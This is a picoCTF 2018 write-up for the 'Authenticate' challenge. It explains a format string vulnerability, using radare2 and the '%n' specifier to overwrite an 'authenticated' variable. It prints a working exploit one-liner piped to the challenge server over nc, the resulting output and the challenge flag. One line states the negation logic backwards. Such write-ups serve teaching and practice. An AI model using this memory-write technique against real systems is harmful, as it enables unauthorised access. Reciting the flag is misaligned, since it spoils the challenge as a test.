# Authenticate

Can you authenticate to this [service](auth) and get the flag? Connect with `nc 2018shell.picoctf.com 52918`. [Source](auth.c).

## Solution
This was a format string vulnerability. Since the binary is not using ASLR, I used [radare2](https://github.com/radareorg/radare2) to find the address of the `authenticated` variable. I later discovered the `%n` format specifier writes the number of characters written so far to a signed int. This signed integer is passed in as a parameter. So using radare2 I discovered that the input string is `11 words (32-bit words)` away from the stack pointer. Thus I crafted an input string that would write, the number of characters written so far, to the `authenticated` integer.

Since the `authenticated` integer would no longer be zero, then `!authenticated` would evaluate to `true`.

### Exploit
Naturally the exploit then becomes:

```
$ echo -e '\x4c\xa0\x04\x08 %11$n' | nc 2018shell.picoctf.com 52918
Would you like to read the flag? (yes/no)
Received Unknown Input:

L 
Access Granted.
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}
```
